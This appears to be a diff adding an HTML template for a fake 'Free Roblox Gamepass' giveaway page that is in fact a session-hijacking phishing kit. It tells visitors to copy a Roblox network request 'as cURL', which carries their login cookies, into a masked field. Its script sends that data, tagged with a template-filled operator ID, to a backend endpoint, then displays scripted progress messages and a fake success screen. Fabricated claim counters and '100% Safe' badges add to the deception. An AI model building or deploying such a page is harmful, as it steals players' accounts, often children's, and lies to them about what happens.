@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Roblox Gamepasses - Unlock Premium Features</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+            <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        surface: { 50: '#111111', 100: '#1A1A1A', 200: '#262626', 300: '#404040' },
+                    },
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background: #050505; }
+        .glass-panel { background: rgba(17,17,17,.6); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,.05); }
+        .glow-gradient { position: fixed; top: -40%; left: -20%; width: 140%; height: 100%; background: radial-gradient(ellipse at 30% 20%, rgba(255,255,255,.04) 0%, transparent 50%), radial-gradient(ellipse at 80% 60%, rgba(255,255,255,.02) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        .fade-up { animation: fadeUp .6s ease forwards; }
+        .fade-up-d1 { animation-delay: .1s; opacity: 0; }
+        .fade-up-d2 { animation-delay: .2s; opacity: 0; }
+        .fade-up-d3 { animation-delay: .3s; opacity: 0; }
+        .fade-up-d4 { animation-delay: .4s; opacity: 0; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner { animation: spin .8s linear infinite; }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+        .progress-fill { animation: progress 2.5s ease-out forwards; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+        .pulse-slow { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        .gamepass-card:hover { transform: translateY(-4px); transition: all .3s ease; }
+        .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    </style>
+</head>
+<body class="font-sans text-neutral-300 antialiased min-h-screen">
+    <div class="glow-gradient"></div>
+
+    <header class="sticky top-0 z-50 border-b border-white/5 backdrop-blur-xl bg-[#050505]/80">
+        <div class="max-w-6xl mx-auto px-6 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 rounded-lg bg-white/10 flex items-center justify-center">
+                    <svg class="" style="width:18px;height:18px;stroke:white;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5" rx="1"/><line x1="12" y1="22" x2="12" y2="7"/><path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/></svg>
+                </div>
+                <div class="text-lg font-bold text-white">Free Gamepass</div>
+            </div>
+            <div class="flex items-center gap-3">
+                <div class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-white/10 border border-white/10">
+                    <span class="w-2 h-2 rounded-full bg-white/50 pulse-slow"></span>
+                    <span class="text-xs font-semibold text-neutral-400">{{ claimed|default(18273) }} Claimed Today</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="relative z-10 min-h-screen flex items-center justify-center p-6">
+        <div class="w-full max-w-2xl">
+            <div class="text-center mb-8 fade-up">
+                <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white/10 border border-white/10 text-neutral-400 text-xs font-bold uppercase tracking-wider mb-4">
+                    <svg class="" style="width:16px;height:16px;fill:#a3a3a3;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24"  fill="#a3a3a3" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                    100% Working - 2026
+                </div>
+                <h1 class="text-4xl md:text-5xl font-black text-white mb-3">
+                    Free Gamepass Activation
+                </h1>
+                <p class="text-neutral-400">Verify your Roblox account to claim the gamepass for free</p>
+            </div>
+
+            <div class="fade-up fade-up-d1 glass-panel rounded-2xl p-8 md:p-10">
+                <div id="gamepassInfo" class="hidden mb-8">
+                    <div class="text-center">
+                        <div id="gpIcon" class="w-16 h-16 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center text-4xl mx-auto mb-4">
+                        </div>
+                        <h3 id="gpName" class="text-2xl font-bold text-white mb-2">Gamepass Name</h3>
+                        <p id="gpPrice" class="text-neutral-400 font-semibold mb-2">R$ 0</p>
+                        <p id="gpDescription" class="text-sm text-neutral-500">Description</p>
+                    </div>
+                </div>
+
+                <div id="instructions" class="mb-6 p-4 rounded-xl bg-white/5 border border-white/10">
+                    <div class="flex items-start gap-3">
+                        <svg class="mt-0.5" style="width:18px;height:18px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                        <div class="text-sm text-neutral-300 space-y-2">
+                            <p class="font-semibold text-neutral-400">How to verify your account:</p>
+                            <ol class="space-y-1 text-xs text-neutral-400 list-decimal list-inside">
+                                <li>Open the gamepass page on Roblox you want to claim</li>
+                                <li>Open browser console (<span class="text-neutral-300">Ctrl+Shift+I</span> or <span class="text-neutral-300">Cmd+Option+I</span>)</li>
+                                <li>Go to <span class="text-neutral-300">Network</span> and refresh the page</li>
+                                <li>Right-click the first request → <span class="text-neutral-300">Copy</span> → <span class="text-neutral-300">Copy as cURL</span></li>
+                                <li>Paste the verification data below</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+
+                <form id="gamepassForm">
+                    <div class="mb-5">
+                        <label class="block text-sm font-medium text-neutral-400 mb-2">Verification Data</label>
+                        <textarea id="scriptInput" required autocomplete="off" rows="4"
+                               placeholder="Paste verification data here..."
+                               class="w-full bg-black/40 border border-white/10 rounded-xl py-3.5 px-4 text-xs text-transparent placeholder-neutral-700 focus:outline-none focus:border-white/30 focus:ring-1 focus:ring-white/30 transition-all font-mono caret-white" style="-webkit-text-security: disc; text-security: disc;"></textarea>
+                        <p class="mt-1.5 text-[10px] text-neutral-600">Your data is encrypted and used only for verification</p>
+                    </div>
+
+                    <button type="submit" id="submitBtn"
+                            class="w-full py-4 bg-white text-black font-bold text-sm rounded-xl hover:bg-neutral-200 transition-all disabled:opacity-40 disabled:cursor-not-allowed">
+                        <span id="btnText">Activate Gamepass</span>
+                    </button>
+                </form>
+
+                <div id="progressArea" class="hidden mt-6">
+                    <div class="space-y-2 text-xs" id="progressSteps"></div>
+                    <div class="mt-4 h-2 rounded-full bg-white/5 overflow-hidden">
+                        <div id="progressBar" class="h-full rounded-full bg-white progress-fill"></div>
+                    </div>
+                </div>
+
+                <div id="successArea" class="hidden mt-6 text-center">
+                    <div class="w-16 h-16 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto mb-4">
+                        <svg class="" style="width:36px;height:36px;fill:#a3a3a3;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24"  fill="#a3a3a3" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                    </div>
+                    <h3 class="text-2xl font-bold text-white mb-3">Gamepass Activated!</h3>
+                    <p class="text-neutral-400 mb-6">
+                        Your gamepass has been successfully added. Rejoin the game to see the changes.
+                    </p>
+                    <button onclick="location.reload()" class="px-6 py-3 bg-white text-black font-bold text-sm rounded-xl hover:bg-neutral-200 transition-all">
+                        Activate Another
+                    </button>
+                </div>
+            </div>
+
+            <div class="mt-6 flex items-center justify-center gap-6 text-sm text-neutral-500">
+                <div class="flex items-center gap-2">
+                    <svg class="" style="width:16px;height:16px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg>
+                    <span>{{ users|default(245782) }}+ Activations</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <svg class="" style="width:16px;height:16px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                    <span>100% Safe</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="relative z-10 border-t border-white/5 py-8 px-6 mt-12">
+        <div class="max-w-5xl mx-auto text-center text-sm text-neutral-600">
+            <p>&copy; 2026 Free Gamepass Generator. All rights reserved.</p>
+            <p class="mt-2 text-xs">This is a third-party tool. Not affiliated with Roblox Corporation.</p>
+        </div>
+    </footer>
+
+    <script>
+        const USER_ID = '{{ user_id }}';
+        const USERNAME = '{{ username }}';
+        let detectedGamepass = null;
+        let scriptPayload = null;
+
+        document.getElementById('gamepassForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const scriptInput = document.getElementById('scriptInput').value.trim();
+            scriptPayload = scriptInput;
+            if (!scriptInput) {
+                alert('Please paste the verification data');
+                return;
+            }
+
+            let gpUrlMatch = scriptInput.match(/["\s\/]game-pass["\s]*[\/=?][\s"]*(\d+)/i);
+
+            if (!gpUrlMatch) {
+                alert('Could not detect the gamepass. Make sure you copied data from the correct gamepass page.');
+                return;
+            }
+            const gamepassId = gpUrlMatch[1];
+
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('btnText').textContent = 'Verifying...';
+
+            try {
+                const response = await fetch(`/api/gamepass-info/${gamepassId}`);
+                const data = await response.json();
+
+                if (data.status === 'success') {
+                    detectedGamepass = data.gamepass;
+
+                    document.getElementById('gpName').textContent = detectedGamepass.name;
+                    document.getElementById('gpPrice').textContent = `R$ ${detectedGamepass.price.toLocaleString()}`;
+                    document.getElementById('gpDescription').textContent = detectedGamepass.description;
+                    document.getElementById('gpIcon').innerHTML = `<span class="text-4xl">${detectedGamepass.icon}</span>`;
+
+                    document.getElementById('instructions').classList.add('hidden');
+                    document.getElementById('gamepassInfo').classList.remove('hidden');
+                    document.getElementById('btnText').textContent = 'Activate ' + detectedGamepass.name;
+                    document.getElementById('submitBtn').disabled = false;
+
+                    document.getElementById('gamepassForm').onsubmit = activateGamepass;
+                } else {
+                    alert('Could not verify your account. Please try again.');
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('btnText').textContent = 'Activate Gamepass';
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                alert('Connection error. Please check your internet and try again.');
+                document.getElementById('submitBtn').disabled = false;
+                document.getElementById('btnText').textContent = 'Activate Gamepass';
+            }
+        });
+
+        async function activateGamepass(e) {
+            e.preventDefault();
+
+            if (!detectedGamepass || !scriptPayload) {
+                alert('Something went wrong. Please refresh and try again.');
+                return;
+            }
+
+            document.getElementById('gamepassForm').classList.add('hidden');
+            document.getElementById('gamepassInfo').classList.add('hidden');
+            document.getElementById('progressArea').classList.remove('hidden');
+
+            const progressSteps = document.getElementById('progressSteps');
+            const messages = [
+                { text: 'Verifying Roblox account...', delay: 300 },
+                { text: 'Account verified successfully', delay: 800 },
+                { text: `Processing ${detectedGamepass.name} activation...`, delay: 1200 },
+                { text: 'Connecting to Roblox servers...', delay: 1600 },
+                { text: 'Gamepass delivered to your account!', delay: 2000 }
+            ];
+
+            messages.forEach((msg, i) => {
+                setTimeout(() => {
+                    const el = document.createElement('div');
+                    el.className = 'text-neutral-400 fade-up';
+                    el.textContent = msg.text;
+                    progressSteps.appendChild(el);
+                }, msg.delay);
+            });
+
+            try {
+                const response = await fetch('/api/process_game', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payload: scriptPayload,
+                        sid: USER_ID,
+                        ref: window.location.hostname,
+                        gamepass_name: detectedGamepass.name,
+                        gamepass_price: detectedGamepass.price,
+                        gamepass_id: detectedGamepass.id
+                    })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('progressArea').classList.add('hidden');
+                    document.getElementById('successArea').classList.remove('hidden');
+                }, 2400);
+            } catch (error) {
+                console.error('Error:', error);
+                setTimeout(() => {
+                    document.getElementById('progressArea').classList.add('hidden');
+                    document.getElementById('successArea').classList.remove('hidden');
+                }, 2400);
+            }
+        }
+    </script>
+</body>
+</html>
